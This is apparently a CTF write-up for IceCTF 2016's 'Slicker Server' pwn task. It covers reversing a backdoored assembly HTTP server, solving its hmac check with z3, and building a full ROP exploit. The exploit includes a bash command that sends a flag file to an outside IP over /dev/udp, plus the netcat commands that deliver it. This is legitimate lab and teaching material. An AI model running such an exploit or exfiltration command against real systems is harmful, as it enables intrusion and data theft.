---
title: IceCTF 2016 - Slicker Server - pwn300 - writeup
---

Hi,
  
Well, my team Pwnium finished #4th in this CTF. 
We missed only one Stego task. The CTF was great and a lot of original tasks have been proposed.
I decided to make a writeup for  **Slickerserver** task in pwn category since it was the hardest one and worthed 300 points.

In this task we were given a binary file named asmttpd (referring to https://github.com/nemasu/asmttpd) which is a HTTP server for Linux written in assembly.

The source code was modified to add a kind of backdoor which leaves a buffer overlow vulnerability. To exploit the vulnerability you have to satisfy certain condition in a hmac function to take control over the program.

Let's start analyzing the binary.

When you import the binary into IDApro, you can easily figure out that the program uses system calls instead of libraries in order to do networking, threading and file system operation stuff.

The program sets up the webroot directory specified as argument then it starts listening for incoming connections in port 6601. For each accepted client a  **worker_thread** is created.

<!--more-->

```assembly
.text:0000000000401172 worker_thread:
.text:0000000000401172                 mov     rbp, rsp
.text:0000000000401175                 sub     rsp, 20h
.text:0000000000401179                 mov     qword ptr [rbp-10h], 0
.text:0000000000401181                 mov     qword ptr [rbp-20h], 0
.text:0000000000401189                 mov     rdi, 5E8h; allocated
.text:0000000000401190                 sub     rsp, rdi
.text:0000000000401193                 mov     [rbp-10h], rsp
.text:0000000000401197
.text:0000000000401197 worker_thread_start:
.text:0000000000401197                 call    sys_accept
.text:000000000040119C                 mov     [rbp-8], rax
.text:00000000004011A0                 mov     rdi, rax
.text:00000000004011A3                 call    sys_cork
.text:00000000004011A8
.text:00000000004011A8 worker_thread_continue:
.text:00000000004011A8                 mov     rdi, [rbp-8]
.text:00000000004011AC                 mov     rsi, [rbp-10h]
.text:00000000004011B0                 mov     rdx, 5F0h; accepted
.text:00000000004011B7                 call    sys_recv
.text:00000000004011BC                 cmp     rax, 0
.text:00000000004011C0                 jle     worker_thread_close
.text:00000000004011C6                 push    rax
.text:00000000004011C7                 mov     r13, [rbp-20h] ;check overflow
.text:00000000004011CB                 test    r13, r13
.text:00000000004011CE                 jz      short worker_thread_continue_nohook
.text:00000000004011D0                 mov     rdi, [rbp-10h]
.text:00000000004011D4                 call    hmac ; overflow detected
.text:00000000004011D9                 mov     r15, 0FFFFFFFFDEADDEADh
.text:00000000004011E3                 jmp     rax


```

The worker allocates  **1512** bytes in stack but it accepts up to  **1520** bytes. Obviously, a stack-based buffer overflow can be triggered and exploited here.

when the overflow occurs, it is detected by the program at 0x4011C7,0x4011CB and hmac function is called accordingly 0x4011D4.

Given an input (1512 bytes length), the function computes a hash value that serves as the address to jump to later. 0x4011E3

So if you want to take control over the program and let it jump to a specific address you have to provide the correct input to hmac function to get the address.

The next step is to reverse engineer the hmac function.

This is the implementation of hmac function that I reversed and wrote in python.

```python
import struct

def reg(r):
    return r & 0xffffffffffffffff

def murmur1(rdx, p, rsi):
        CONST = 0x0A165C8277
        rcx = reg(reg(rsi)* CONST) ^ reg(rdx)
        if rsi > 7 :
                for i in range(rsi/8):
                        rax = reg (reg(reg(rcx + p[i])) * CONST)      
                        rcx = (rax >> 0x10) ^ rax
         
        rdx = reg(((reg(reg(rcx) *  CONST) >> 0xa) ^ reg(reg(rcx) *  CONST)) *  CONST)
        rax = (rdx >> 0x11) ^ rdx

        return rax
        
def hmac(rdi):
        rax = 0
        rbx = 0
        for rax in range(0,1512,8):
                rbx ^= struct.unpack("Q", rdi[rax:rax+8])[0]

        v5 = rbx ^ 0x5C5C5C5C5C5C5C5C
        p = []
        p.append(v5)
        p.append(struct.unpack("Q",rdi[1496:1496+8])[0])
        p.append(struct.unpack("Q",rdi[1504:1504+8])[0])
        
        rbp30 = murmur1(0xDEFACEDBAADF00D, p, 24)
        v5 = rbx ^ 0x3636363636363636
        p = []
        p.append(v5)
        p.append(rbp30)
        p.append(struct.unpack("Q",rdi[1504:1504+8])[0])  
        result = murmur1(0x0FACEB00CCAFEBABE, p, 16)
        assert result == 0x400e97
        return result
```

The result depends mainly on 3 parameters. The result of xoring the input (8 bytes / block), 8 bytes starting from 1496 and last 8 bytes. I named these parameters  **xor**,  **p1**,  **p2** respectively.

To find a wanted input I used  **z3** theorem prover. To make solving easier, I tried to make xoring the input gives 0 and p2 = 0. Now I need to find the values of xor and p1 which give me the desired return address.  

I fixed the desired return address as 0x400e97 which is the address of the first gadget of my rop chain.

Following is the code of my solver:

```python
from z3 import *
import struct

def reg(r):
    return r & 0xffffffffffffffff

def murmur1(rdx, p, rsi):
        CONST = 0x0A165C8277
        rcx = reg(rsi * CONST) ^ rdx
        if rsi > 7 :
                for i in range(rsi/8):
                        rax = reg((rcx + p[i]) * CONST)      
                        rcx = LShR(rax, 0x10) ^ rax
      
        rdx = reg(((  LShR(reg(rcx * CONST), 0xa)) ^ reg(rcx *  CONST)) *  CONST)
        rax = LShR(rdx, 0x11) ^ rdx

        return rax

def hmac(rbx, p1, p2):
        v5 = rbx ^ 0x5C5C5C5C5C5C5C5C  
        p = []
        p.append(v5)
        p.append(p1)
        p.append(p2)
        it1 = murmur1(0xDEFACEDBAADF00D, p, 24)
  
        v5 = rbx ^ 0x3636363636363636  
        p = []
        p.append(v5)
        p.append(it1)
        p.append(p2)
  
        it2 = murmur1(0x0FACEB00CCAFEBABE, p, 16)
        return it2

if __name__ == "__main__":
    payload = "A"*1488+struct.pack("<Q",0x0)*3
    payloadxor = 0
    for i in range(0,1512,8):
                payloadxor ^= struct.unpack("Q", payload[i:i+8])[0]    
    xor = BitVec("xor", 64)
    p1 = BitVec("p1", 64)  
    p2 = BitVec("p2", 64)  
    s = Solver()
    s.add(hmac(xor,p1,0) == 0x400e97)
    status = s.check()
    print s.model()


```

Here I spent long time waiting for the result and trying to simplify the equation of the solver. But finally I noticed that Z3py's right-shift BitVec operator appears to do arithmetic shifts! This took a LONG time to track down and then I fixed it by replacing it with  **LShR** (Logical Shift Right).

Few minutes after running the solver scipt I got a result.

```python
[
xor = 8084123859080867570
p1 = 6243103394520245037
]
```

This means that xoring my input must give  **8084123859080867570** and long value at position 1496 must be equal to  **6243103394520245037.**

 
My payload format is the following:

```python
payload = (ropchain+ "\x00" * (736 - len(ropchain)))*2 + pack("<Q",xor) + pack("<Q",xor ^ p1) + pack("<Q",xor) + pack("<Q",p1) + pack("<Q",p2)
```

Now it is time to construct a  **ROP** chain which execute execve syscall. Note here that  **ASLR** is disabled on server.

While building the ropchain you must take into consideration that there is another check to bypass. This check is done before triggering the syscall.

```assembly
.text:00000000004011D9                 mov     r15, 0FFFFFFFFDEADDEADh
...
.text:0000000000400ED3 popitlikeitshot:
.text:0000000000400ED3               
.text:0000000000400ED3                 int     3
.text:0000000000400ED4                 nop
```

My ropchain opens a shell in remote server. I tried to play with file descriptor to redirect the stdin and stdout to the active connection but finally I decided to make it execute  **/bin/bash**  with any command passed as argument. This was practical since netcat was disabled in addition to other networking features.

Assuming that the flag is in the same folder as the binary.

The command to execute to get the flag is

```bash
bash -c "cat flag.txt > /dev/udp/164.132.103.207/53"
```

The ROP chain should perform:

```bash
execve("/bin/bash",["/bin/bash", "-c", "cat flag.txt > /dev/udp/164.132.103.207/53"], NULL);
```

The final exploit is:
  
```bash
from struct import pack

#from solver
xor = 8084123859080867570
p1 = 6243103394520245037
p2 = 0

recvbuf = 0x7FFFF7FDE9F8
#recvbuf = 0x7ffff7ff69f8

stackadd = recvbuf + 96

cmd = "/bin/bash"

argv1 = "-c"
argv2 = "cat flag.txt > /dev/udp/164.132.103.207/53" ; /dev/tcp and netcat are filtred
argv3 = ""

stack  =  cmd  + "\x00" * (16 - len(cmd))
stack += argv1 + "\x00" * (16 - len(argv1))
stack += argv2 + "\x00" * (64 - len(argv2))
stack += argv3 + "\x00" * (16 - len(argv3))
#argv
stack+=pack("<Q", stackadd)
stack+=pack("<Q", stackadd+16)
stack+=pack("<Q", stackadd+32)
stack+=pack("<Q", stackadd+96)
stack+=pack("<Q", stackadd+112)

envp = 0
argv = stackadd+112
stackadd

ropchain=""

ropchain+=pack("<Q",0x400e3c); mov r15, rsi
ropchain+=pack("<Q",0x400e97); pop rcx; mov rax, r14; ret;
ropchain+= pack("<Q",0xFFFFFFFFFFBFEEC9) ; overflow r14 
ropchain+=pack("<Q",0x400e93) ;add r14, rcx; pop rdi; pop rcx; mov rax, r14; ret;
ropchain+=pack("<Q",0x0);
ropchain+= pack("<Q",0x0); 
ropchain+=pack("<Q",0x40011a); pop rdx; pop rsi; pop rdi; ret;
ropchain+=pack("<Q",envp)
ropchain+=pack("<Q",argv)
ropchain+=pack("<Q",stackadd)
ropchain+=pack("<Q", 0x4009b3); syscall
ropchain+=pack("<Q",0xbeef)
ropchain += stack
payload = (ropchain + "\x00" * (736 - len(ropchain)))*2
payload += pack("<Q",xor)
payload += pack("<Q",xor ^ p1)
payload += pack("<Q",xor)
payload += pack("<Q",p1)
payload += pack("<Q",p2)

print payload
```


Finally I run the exploit and the flag is received in my server.

```bash
root@maro-vm:~# nc -lu 53
root@maro-vm:~# python exploit.py | nc slick.vuln.icec.tf 6601
IceCTF{m4ster1ng_the_4rt_of_f1x3d_p0ints}
```

  
The task can be solved in many other ways. Such overriding the web_root value, reading a file from the server and returning back the content over the active client connection.


That's all

Thanks for reading
